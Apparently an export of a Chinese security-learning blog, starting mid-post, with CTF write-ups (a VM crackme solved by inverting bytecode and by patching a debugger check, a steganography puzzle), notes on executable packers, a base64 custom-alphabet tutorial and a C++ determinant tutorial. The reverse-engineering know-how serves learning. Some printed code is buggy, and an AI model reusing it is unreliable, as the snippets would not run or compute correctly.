123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#include&lt;stdio.h&gt;#include&lt;string.h&gt;unsigned char vmcode[] = //数据库&#123; 0x0A, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x51, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x25, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x25, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x41, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x22, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x3F, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x32, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x72, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x33, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0xA7, 0xFF, 0xFF, 0xFF, 0x07, 0x00, 0x00, 0x00, 0x31, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0xF1, 0xFF, 0xFF, 0xFF, 0x07, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x84, 0xFF, 0xFF, 0xFF, 0x07, 0x00, 0x00, 0x00, 0xC1, 0xFF, 0xFF, 0xFF, 0x07, 0x00, 0x00, 0x00, 0x1E, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 &#125;;int __cdecl vm_solve(int* code, int len114)&#123; unsigned char flag[100] = &#123;&#125;; unsigned char v4[] = &#123; 0x22,0x3f,0x34,0x32,0x72,0x33,0x18,0xffffffa7,0x31,0xfffffff1,0x28,0xffffff84,0xffffffc1,0x1e,0x7a &#125;; //因为flag的前百位和后百位是独立的，所以我将flag的后百位分出来新设了一个数组v4 char order[100] = &#123; 1,3,4,6,7,9,10,12,13,15,16,17,18,19,20,22,23,25,26,28,29,30,31,32,33,35,36,38,39,41,42,44,45,46,47,48,49,51,52,54,55,57,58,60,61,63,64,66,67,69,70,72,73,75,76,78,79,81,82,83,84,86,88,90,92,94,96,98,100,102,104,106,108,110,112,114 &#125;; int tmp; int v6 = 15; int v8 = 15; int v5 = 15; int v9 = 0; for (int j = strlen(order) - 1; j &gt;= 0; j--) //v9是从order的后面往前取的，所以j=strlen(order)-1 &#123; v9 = order[j]; //v9按照正向运行得到的值反过来取一遍 switch (code[v9]) &#123; case 1: --v6; --v8; tmp = v4[v6]; break; case 2: //tmp = code[i + 1] + flag[v8]; flag[v8] = tmp - char(code[v9 + 1]); break; case 3: //tmp = flag[v8] - code[i + 1]; flag[v8] = tmp + char(code[v9 + 1]); break; case 4: //tmp = code[i + 1] ^ flag[v8]; flag[v8] = (tmp ^ code[v9 + 1]) &amp; 0xFF; //&amp; 0xFF是为了确保是取低二位，在这里有没有&amp; 0xFF结果一样 break; case 5: //tmp = code[i + 1] * flag[v8]; flag[v8] = tmp / code[v9 + 1]; break; case 6: break; case 8: //flag[v5] = tmp; --v5; tmp = flag[v5]; break; case 11: //tmp = flag[v8] - 1; flag[v8] = tmp + 1; break; case 12: //tmp = flag[v8] + 1; flag[v8] = tmp - 1; break; &#125; &#125; printf(&quot;%s&quot;, flag); return 0;&#125;int main()&#123; vm_solve(a, 114); return 0;&#125; 运行一下，得到flag 方法二：动态调试用动调的方法，也是需要求出a1[v9 + 1]也就是用来比较的值的，只不过不是像上面那样复制粘贴运行来求，我们用动调的方式来求： 首先我们要先下好断点，我在下面几个地方下的断点，仅供参考： 断点设完之后，我们要让程序能够运行到退出循环才行，但是我们不知道flag，没法确保case 7进行比较的时候能够顺利通过，所以我们将图十三的 je 0x004016FE 改成 jmp 0x004016FE，这样我们只要在运行到这里的时候看一下用来比较的值是什么就可以了，接下来可以继续运行然后看下一个进行比较的值直到循环结束 现在来运行， 到了输入的地方，我们知道flag是15位的，输入一个15位的字符串，特别注意这里是把我们输入的flag放到了ss:[ebp+8]，这个要留意，对后面判断哪一个是我们要的数据很重要 这里我们看到在比较之前最后对eax进行操作的是004014E0处的指令，它是把ds:[eax]处的值放到了eax中，并不是我们输入的flag（上面提到了我们输入的flag是放到了ss:[ebp+8]处），所以这时eax里的值就是我们要的，记录这里eax里的值：0x22 然后我们直接F9运行 按了F9后可以发现画面并没有动，但其实是循环回来后有运行到了这个断点停下了，我们看到这个时候eax里的值是0x3F，记录下来，然后重复F9运行，记录eax里的值的操作，知道运行到我们设的断点四退出循环 ![](&#x2F;images&#x2F;[网鼎杯 2020 青龙组]singal&#x2F;image-21-1024x328.png) 15次比较完了后，就马上要退出循环了，运行到第四个断点，这样我们就得到了要用来比较的值都是什么了 然后分析一下源代码可以得到每个值是怎么得到的 12345678910111213141516171819202122232425262728290x22 = (flag[0] ^ 0xa) - 50x3f = (flag[1] ^ 0x20) * 30x34 = (flag[2] - 2) - 10x32 = (flag[3] + 1) ^ 40x72 = (flag[4] * 3) - 0x210x33 = (flag[5] - 1) - 1 0x18 = (flag[6] ^ 9) - 0x200xffffffa7 = (flag[7] + 0x51) ^ 0x240x31 = (flag[8] +1 ) - 10xfffffff1 = (flag[9] * 2) + 0x250x28 = (flag[10] + 0x36) ^ 0x410xffffff84 = (flag[11] + 0x20) * 10xffffffc1 = (flag[12] *3) + 0x250x1e = (flag[13] ^ 9) - 0x200x7a = (flag[14] + 0x41) + 1 然后写出脚本得到flag 1234567891011121314151617181920212223x = [0x22,0x3f,0x34,0x32,0x72,0x33,0x18,0xffffffa7,0x31, 0xfffffff1,0x28,0xffffff84,0xffffffc1,0x1e,0x7a]flag = [0]*15flag[0] = (x[0] + 5) ^ 0x10flag[1] = (x[1] // 3) ^ 0x20flag[2] = (x[2] + 3)flag[3] = (x[3] ^ 4) - 1flag[4] = (x[4] + 0x21) // 3flag[5] = x[5] + 2flag[6] = (x[6] + 0x20) ^ 9flag[7] = ((x[7] &amp; 0xFF) ^ 0x24) - 0x51flag[8] = x[8]flag[9] = ((x[9] &amp; 0xFF) - 0x25) // 2flag[10] = (x[10] ^ 0x41) - 0x36flag[11] = (x[11] &amp; 0xFF) - 0x20flag[12] = ((x[12] &amp; 0xFF) - 0x25) // 3flag[13] = (x[13] + 0x20) ^ 9flag[14] = (x[14] - 1) - 0x41result = &quot;&quot;for i in range(len(flag)): result += chr(flag[i])print(result) 得到flag","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/categories/WriteUp/"},{"name":"Re","slug":"WriteUp/Re","permalink":"http://example.com/categories/WriteUp/Re/"}],"tags":[]},{"title":"红明谷杯2023阿尼亚","slug":"红明谷杯 2023 阿尼亚","date":"2023-11-15T03:15:23.000Z","updated":"2024-01-21T13:17:58.023Z","comments":true,"path":"2023/11/15/红明谷杯 2023 阿尼亚/","link":"","permalink":"http://example.com/2023/11/15/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%202023%20%E9%98%BF%E5%B0%BC%E4%BA%9A/","excerpt":"","text":"红明谷杯 2023 阿尼亚下载后得到的是一个压缩包和一张阿尼亚的图片 压缩包需要密码才能得到 flga.txt，所以我们需要根据图片得到密码 在 stegsolve 里没有得到什么有用的 放到 010editor 里，发现最后面有一串额外的数字（PNG (png) 的文件头：89 50 4E 47; 文件尾；AE 42 60 82） 学到的第一个东西：hex 编码，原理非常的简单： 将上面找到的数字当作 hex 码转换为十六进制数： 再次解码： 看上去像是某种编码，试试直接暴力解一下编码方式： 密码得到了，但是汉字不能作为 zip 的密码 学到的第二个东西：图片的命名：netpixeljihad ，提示用 pixeljihad 解开图片隐写 ![](&#x2F;images&#x2F;红明谷杯2023阿尼亚&#x2F;image-106 (1).png) 这才是压缩包的密码，得到 flag.txt 全是 正负号 学到的第三个东西：不知道的编码方式可以用 dcode.fr 查查 比如这个是 decabit code","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/categories/WriteUp/"},{"name":"Misc","slug":"WriteUp/Misc","permalink":"http://example.com/categories/WriteUp/Misc/"}],"tags":[]},{"title":"PE文件格式-运行时压缩","slug":"PE文件格式-14运行时压缩","date":"2023-11-14T15:14:22.000Z","updated":"2024-02-24T07:27:24.803Z","comments":true,"path":"2023/11/14/PE文件格式-14运行时压缩/","link":"","permalink":"http://example.com/2023/11/14/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F-14%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8E%8B%E7%BC%A9/","excerpt":"","text":"14.1 数据压缩不论哪种形态的文件（数据）都是由二进制组成的，只要使用合适的压缩算法，就能缩减其大小。经过压缩的文件若能100%恢复，则称该压缩为“无损压缩”；若不能，则称为“有损压缩” 14.1.1 无损压缩无损压缩用来缩减文件（数据）的大小，压缩后的文件更易保管、移动。使用经过压缩的文件之前，需要先对文件解压缩（此过程中应该保证数据完整性） 7z、ZIP、RAR等都是具有代表性的压缩文件格式，，它们最根本的压缩理念是Run-Length、Lempel-Ziv、Huffman（这些都是最具代表性的无损压缩算法，还有许多其它压缩算法都是在上面3种压缩算法的基础上改造而成的），然后各自应用了一些各自特有的技术（压缩率、压缩\\解压时间） 14.1.2 有损压缩有损压缩运行压缩文件（数据）时损失一定信息，以此换取高压缩率。压缩多媒体文件（jpg、mp3、mp4）时，大部分都使用这种有损压缩方式。人类的肉眼与听觉几乎无法察觉到这些多媒体文件在压缩中损失的数据。以mp3为例，mp3的核心算法通过删除超越人类听觉范围（20~20000Hz）的波长区段来缩减（不需要的数据大小） 14.2 运行时压缩器运行时压缩器时针对可执行文件而言的，可执行文件内部含有解压缩代码，文件在运行瞬间于内存中解压缩后执行 运行时压缩文件也是PE文件，内部含有原PE文件与解码程序。在程序的EP代码中执行解码程序，同时在内存中解压缩后执行 项目 普通压缩 运行时压缩 对象文件 所有文件 PE文件（exe、dll、sys） 压缩结果 压缩文件（zip、rar） PE文件（exe、dll、sys） 解压缩方式 使用专门解压缩程序 内部含有解码程序 文件是否可执行 本身不可执行 本身可执行 优点 可以对所有文件以高压缩率压缩 无需专门解压程序便可直接运行 缺点 若无专门解压缩软件则无法使用压缩文件 每次运行均需要调用解码程序导致运行时间过长 可以看到，与普通压缩器相比，运行时压缩器的一个明显不同时“PE文件的可运行性” 把普通PE文件创建成运行时压缩文件的实用程序称为“压缩器”（Packer），经反逆向（Anti-Reversing）技术特别处理的压缩器称为保护器（Protector） 14.2.1 压缩器#1.使用目的缩减PE文件的大小 隐藏PE文件内部代码与资源（字符串、API名称字符串等） #2.压缩器种类PE压缩器大致可分为两种： 一类是单纯用于压缩普通PE文件的压缩器，比如说UPX、ASPack等 另一类是对源文件进行较大变形、严重破坏PE头、意图稍显不纯的压缩器（这里的意图不纯的压缩器是指专门用于恶意程序，如Virtus、Trojan、Worm等），比如说UPack、PESpin、NSAnti等 14.2.2 保护器不同于普通的压缩器，保护器还会应用多种防止代码逆向分析的技术（反调试、反模拟、代码混乱、多态代码、垃圾代码、调试器监视等）。这类保护器使压缩后的PE文件尺寸反而比源文件要大一些 #1.使用目的防止破解 不仅可以保护PE文件本身，还可以在文件运行时保护进程内存，防止打开Dump窗口 #2.使用现状比如说游戏的安全保护程序。当然还有那些意图不纯的恶心代码（Trojan、Worm）中也大量使用保护器来防止（或降低）杀毒软件的检测。有些保护器还能提供“多变的代码”，每次都会生成不同形态当功能相同的代码，这给病毒诊断带来很大困难 14.3 运行时压缩测试以notepad.exe为例进行运行时压缩测试 我使用的压缩器是UPX，操作简单、功能强大，且完全免费，在命令行窗口运行会显示出UPX的使用说明 把notepad.exe文件复制到工作文件夹后，对notepad.exe进行运行时压缩 从列出的文件中可以看到，压缩后的文件尺寸明显减小了（运行时压缩的压缩率相比普通的zip压缩要低一些，这是由于压缩后得到的是PE文件，需要添加PE头，并且还需要放入解压缩代码） 比较 notepad.exe 与 notepad_upx.exe 文件下图是从PE文件视角比较两个文件的示意图（图是书上的），很好的反映出了UPX压缩器的特点（选用不同类型的压缩器与选项，运行时压缩文件的形态业不相同） 可以看到： PE头的大小一样 节区名称改变 第一个节区的RawDataSize&#x3D;0（文件中的大小为0） EP位于第二个节区（原notepad.exe的EP在第一个节区） 资源节区（.rsrc）的大小几乎无变化 需要注意的是，第一个节区（UPX0）的RawDataSize为0，即第一个节区在磁盘文件中是不存在的。UPX为何要创建这个空的节区呢？我们用PEView查看第一个节区头 这就是说，经过UPX压缩后的PE文件在运行瞬间将（文件中的）压缩的代码解压到（内存中的）第一个节区。下一章使用调试器调试实际的解压缩过程","categories":[{"name":"逆向工程核心原理","slug":"逆向工程核心原理","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"name":"PE文件格式","slug":"逆向工程核心原理/PE文件格式","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"}],"tags":[]},{"title":"Python base64 编解码","slug":"Python base64 编解码","date":"2023-10-31T10:04:14.000Z","updated":"2023-10-31T10:07:54.898Z","comments":true,"path":"2023/10/31/Python base64 编解码/","link":"","permalink":"http://example.com/2023/10/31/Python%20base64%20%E7%BC%96%E8%A7%A3%E7%A0%81/","excerpt":"","text":"Python base64 编解码1. 引入 base64 模块想要在 python 中使用 base64 编解码，我们要先引入 base64 模块 1import base64 这个时候我们就可以使用 base64 模块中的相关功能了 2. 正常的 base64 编码方法在使用编码的函数之前，需要对字符串进行 utf-8 编码一下，不然 python 的 base64 库的函数没法识别对应的字符串而报错；不过解码的时候不需要这部操作 2.1 base64 编码我们来看一下在 Python 中进行 base64 编码的过程， 1234567891011121314151617import base64#引入 base64 模块str = &#x27;hello&#x27;#定义一个字符串bstr = str.encode()#将我们定义的字符串转换为 utf-8#encode()的括号内不填任何内容就会被默认为 &#x27;utf-8&#x27;b64str = base64.b64encode(bstr)#进行 base64 编码print(b64str)#输出编码后的字符串#最后的输出结果是 b&#x27;aGVsbG8=&#x27; 2.2 base64 解码我们再来看一下 base64 的解码过程， 1234567891011121314import base64#引入 base64 模块b64str = &#x27;aGVsbG8=&#x27;#定义一个已编码的字符串str = base64.b64decode(b64str)#进行 base64 解码print(str)#输出解码后的字符串#最后的输出结果是 b&#x27;hello&#x27; 3. 特殊的 base64 编解码什么是特殊的呢，就是其中的编码规则被修改后的编解码 我们知道，标准的 base64 编解码是由一个标准的码表的，那我们修改了这个标准码表后，那编解码的结果也会有所改变，现在我们就来学习一下怎么进行码表修改和进一步编解码 我们先来了解几个语句： 3.1 Python translate()Python translate（） 根据参数表给出的表（包含 256 个字符）转换字符串的字符， 要过滤掉的字符放到 del 参数中 str.translate(table[, deletechars]) 参数： table : 翻译表，翻译表是通过 maketrans 方法转换而来。 deletechars : 字符串中要过滤的字符列表。 Python translate（）的返回值是翻译后的字符串 具体的实例我们在 Python maketrans() 中一起展示 3.1 Python maketrans()Python maketrans() 方法用于创建字符映射的转换表，对于接受两个参数的最简单的调用方式，第一个参数是字符串，表示需要转换的字符，第二个参数也是字符串表示转换的目标。 注：两个字符串的长度必须相同，为一一对应的关系。 str.maketrans(intab, outtab) 参数： intab : 字符串中要被替换的字符组成的字符串 outtab : 字符串中要替换成的字符组成的字符串 Python maketrans() 的返回值是字符串转换后生成的新字符串 123456789101112131415#我们来看一个实例：#Python 3#这里不用引用 string 模块或者从 string 模块中引用 maketrans#这和 Python 2.x 不同，Python 2.x 需要引用上述内容intab = &#x27;adzio5&#x27;outtab = &#x27;@4210S&#x27;trantab = str.maketrans(intab,outtab)str = &#x27;Crazy Thurday vivo 50&#x27;#疯狂暗示print(str.translate(trantab))#最后的输出结果是 Cr@2y Thur4@y v1v0 S0 我们可以看到，intab 中出现的字符都被替换成 outtab 中对应的字符 3.3 实际操作有了以上的知识，我们可以来进行简单的码表替换的 base64 编解码 真是太巧了，我刚好遇到了一道这样的题，我们来看看 已知，base64 的原码表是 ‘ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;‘ 在题目里它被替换成了 ‘TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;‘ 而 flag 被编码后是 ‘d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD&#x3D;&#x3D;’ 现在我们来求一下 flag 首先呢，我们肯定要把码表给换回来，那么就要用到 maketrans() 和 translate() 那我们换回来后呢，还是在已编码状态，所以我们要解码，这样就能得到 flag 了 我们来看一下代码： 1234567891011121314151617181920import base64#引入 base64 库str1 = &quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&quot;string1 = &quot;TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;trantab = str.maketrans(string1,string2)trlate = str1.translate(trantab)#把 str1 里 string1 的对应字符转换成 string2 中的对应字符#也就是换表a = base64.b64decode(trlate)#最后解码print(a)#最后输出的结果是 b&#x27;wctf2020&#123;Base64_is_the_start_of_reverse&#125;&#x27; 就是这么简单","categories":[{"name":"Python相关","slug":"Python相关","permalink":"http://example.com/categories/Python%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"线性结构和非线性结构","slug":"线性结构和非线性结构","date":"2023-10-31T10:02:34.000Z","updated":"2023-10-31T10:08:10.211Z","comments":true,"path":"2023/10/31/线性结构和非线性结构/","link":"","permalink":"http://example.com/2023/10/31/%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84%E5%92%8C%E9%9D%9E%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84/","excerpt":"","text":"线性结构和非线性结构▲线性结构首先，我们先了解一下线性结构： 线性是种什么样的关系呢，简单的理解就是，有一定的联系，即数据之间是相关的。说的学术一点就是数据元素之间存在一对一的线性关系。 而数据元素之间不一定是物理地址上的连续才是线性的，主要看我们如何利用，所以，线性结构的存储可以分为顺序存储&nbsp;和&nbsp;链式存储这两种 看第一张图，其中的数据在地址上是连续存放的，这种存储方式称之为顺序存储。这个线性表称为顺序表。 看第二张图，其中的数据在地址上不是连续存放的，但是我们依然可以用一条链串起来，这种方式称之为链式存储，这个线性表称为链表。 线性结构常见的有：数组，队列，链表和栈 ▲非线性结构在非线性结构中，每个数据不想线性结构一样，保持在一个线性序列中，也就是每个数据之间没有一定的关系。 常见的非线性结构有：二维数组，多维数组，广义表","categories":[{"name":"栈相关","slug":"栈相关","permalink":"http://example.com/categories/%E6%A0%88%E7%9B%B8%E5%85%B3/"}],"tags":[]},{"title":"利用二维数组计算矩阵行列式的值 —— 按行展开计算法","slug":"利用二维数组计算矩阵行列式的值 —— 按行展开计算法","date":"2023-10-31T10:02:00.000Z","updated":"2024-01-23T10:12:18.106Z","comments":true,"path":"2023/10/31/利用二维数组计算矩阵行列式的值 —— 按行展开计算法/","link":"","permalink":"http://example.com/2023/10/31/%E5%88%A9%E7%94%A8%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E8%AE%A1%E7%AE%97%E7%9F%A9%E9%98%B5%E8%A1%8C%E5%88%97%E5%BC%8F%E7%9A%84%E5%80%BC%20%E2%80%94%E2%80%94%20%E6%8C%89%E8%A1%8C%E5%B1%95%E5%BC%80%E8%AE%A1%E7%AE%97%E6%B3%95/","excerpt":"","text":"利用二维数组计算矩阵行列式的值 —— 按行展开计算法![](&#x2F;images&#x2F;利用二维数组计算矩阵行列式的值 —— 按行展开计算法&#x2F;image-70-1368x2048.png) 遇到一道经典题型–求矩阵行列式的值，我们用 C&#x2F;C++ 来实现 1. 基本思路在计算行列式的时候，如果低阶的话，可以很容易算出来，但是阶数高的时候没法在程序里用最基本的算法，也就是对角线法则，将其一项一项进行运算 这时候我们就要将其降阶，具体方法就是将其按照某一行展开，在程序里为了方便就都以第一行展开，并将代数余子式再按其第一列展开，然后以此类推，直到得到了 3 阶或 3 阶以下的子矩阵。为什么是 3 阶或 3 阶以下呢？因为这种低阶数的可以用对角线法则直接计算，当然，为了程序编写方便，我们可以直接将其降阶到 1 阶（一阶行列式 的值等于其唯一元素的值，如 ‘4’ &#x3D;&#x3D; 4） 2. 实现方法2.1 主函数(附上头文件与宏定义)我们要先确定函数要执行些什么、顺序是怎么样的。 12345678910111213141516171819#include&lt;iostream&gt;#include&lt;iomanip&gt; //we need it to use setprecision()#include&lt;math.h&gt; //we need it to use pow()#define N 20 //the max size of matrixint main()&#123; int n; //matrix size double a[N][N]; //matrix double result; cout &lt;&lt; &quot;Please enter matrix size n(1&lt;=n&lt;20)\\n&quot;; cin &gt;&gt; n; //input the matrix size n cout &lt;&lt; &quot;Please input matrix line by line:\\n&quot;; InputMatrix(a, n); //input the matrix PrintMatrix(a, n); //print the matrix result = DeterminantValue(); //get the result of the matrix cout &lt;&lt; result; //print the result&#125; 首先是输入阶数，然后再输入矩阵（InputMatrix），然后输出矩阵（PrintMatrix），接着就是计算出矩阵行列式的值（DeterminantValue），最后输出出来就行了 接下来我们详细看一下每个阶段的函数 2.2 InputMatrix()12345678910void InputMatrix(double a[N][N],int n)&#123; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; cin &gt;&gt; a[i][j]; //input the elements of the matrix &#125; &#125;&#125; 依项输入 2.3 PrintMatrix()1234567891011void PrintMatrix(double a[N][N],int n)&#123; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; cout &lt;&lt; a[i][j]; //print the elements of the matrix &#125; cout &lt;&lt; endl; &#125;&#125; 依项输出，注意换行 2.4 DeterminantValue()这个函数是这个程序的核心函数，也是最重要的函数。我们先来复习一下线性代数，**’A’ &#x3D; a11A11 + a12A12 + …… + a1nA1n &#x3D; Σa1nA1n，其中Aij &#x3D; (-1)i+j Mij** a11、a12……a1n 很容易找出，所以重点就是找出 A11、A12……A1n ，而 i+j 也很容易表示，难点是 Mij 怎么表示，现在我们先把 DeterminantValue() 的主要步骤都写出来 123456789101112131415161718192021222324252627double DeterminantValue(double a[N][N],int n)&#123; int i = 0, j = 0; double result, temp; double sub[N][N]; if (n == 1) &#123; result = a[0][0]; //if the matrix size == 1,result == the elements in matrix &#125; else &#123; result = 0.0; //make result back to zero for (j = 0; j &lt; n; j++) &#123; SubMatrix(); //reduce the size of matrix,namely,find the submatrix cout &lt;&lt; &quot;SubMatrix:\\n&quot;; PrintMatrix(sub, n - 1); //print the submatrix temp = DeterminantValue(sub, n - 1); //find the value of submatrix result += a[0][j] * pow(-1, i + j) * temp; //use submatrix and the corresponding elements in the first line in original matrix to find each value of items cout &lt;&lt; &quot;DValue of the Submatrix is &quot; &lt;&lt; fixed &lt;&lt; setprecision(1) &lt;&lt; temp &lt;&lt; endl; &#125; &#125; return result;&#125; 首先不要忘了我们要解的是什么，是 Mij，也就是子矩阵。子矩阵用来干什么？拿来和 aij 还有 (-1)i+j 相乘，然后再把他们加起来就是答案。所以重点是求 Mij ，不要忘了 那么一开始先判断阶数，如果是 1 阶的那么这个矩阵行列式的值就是里面那个元素的值，如果不是，那我们把它降阶再求，如果降了阶还不是 1 阶的，那就继续降，直到阶数等于 1 那么重点就变成了我们该如何降阶，也就是函数 SubMatrix() 2.4.1 SubMatrix()首先，虽然说是一直降阶，听起来是个很简单的步骤，但是在计算机上想用代码实现并没有想象中的那么简单。我们再来回顾一次，怎么降阶：**’A’ &#x3D; a11A11 + a12A12 + …… + a1nA1n**，所以这其实是个套娃的过程，而套娃已经在 DeterminantValue 中实现了，aij 也表示出来了，那在 SubMatrix 中要求的也就只有 Mij 了，那么子矩阵 Mij 怎么求？看下图找规律（以三阶为例） ![](&#x2F;images&#x2F;利用二维数组计算矩阵行列式的值 —— 按行展开计算法&#x2F;image-71.png) 按照定义，是去掉与 aij 同行同列的其他元素，余下的就是子矩阵；但是在程序里怎么表示呢？&gt; 法一：首先，我们要取的 aij 都是第一行的，所以要的子矩阵的元素都不在第一行，也就是上图中黄色框框内的，我们可以用下面的代码把它们找出来 1234567for(int i = 1; i &lt; n; i++)&#123; for(int j = 0; j &lt; n; j++) &#123; cout &lt;&lt; a[i][j]; &#125;&#125; 找出来后就是排除掉我们不要的，也就是和 aij 同列的 1234567891011121314151617//a[i][j] int ii = 0, jj = 0;double submatrix[N][N];for(int p = 1; p &lt; n; p++) // p start at 1&#123; jj = 0; for(int q = 0; q &lt; n; q++) &#123; if(q != j) &#123; submatrix[ii][jj] = a[p][q]; jj++; &#125; &#125; ii++;&#125; 这样就得到子矩阵了 法二：或者，我们直接用整个原矩阵，这样需要多排除 (n-1) 个元素，不过道理类似 1234567891011121314151617181920//a[i][j] int ii = 0, jj = 0;double submatrix[N][N];for(int p = 0; p &lt; n; p++) // p start at 0&#123; jj = 0; for(int q = 0; q &lt; n; q++) &#123; if(p != i &amp;&amp; q != j) &#123; sub[ii][jj] = a[p][q]; &#125; &#125; if(p != i &amp;&amp; q != j) &#123; ii++; &#125;&#125; 这样也可以 3. 总体12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include&lt;iostream&gt;#include&lt;iomanip&gt;#include&lt;math.h&gt;#define N 20using namespace std;void InputMatrix(double a[N][N], int n)&#123; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; cin &gt;&gt; a[i][j]; //input the elements of the matrix &#125; &#125;&#125;void PrintMatrix(double a[N][N], int n)&#123; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; n; j++) &#123; cout &lt;&lt; fixed &lt;&lt; setprecision(1) &lt;&lt; a[i][j] &lt;&lt; &quot;\\t&quot;; //print the elements of the matrix &#125; cout &lt;&lt; endl; &#125;&#125;void SubMatrix(double a[N][N], double submatrix[N][N], int n, int row, int col)&#123; int ii = 0, jj = 0; for (int p = 1; p &lt; n; p++) // p start at 1 &#123; jj = 0; for (int q = 0; q &lt; n; q++) &#123; if (q != col) &#123; submatrix[ii][jj] = a[p][q]; jj++; &#125; &#125; ii++; &#125;&#125;double DeterminantValue(double 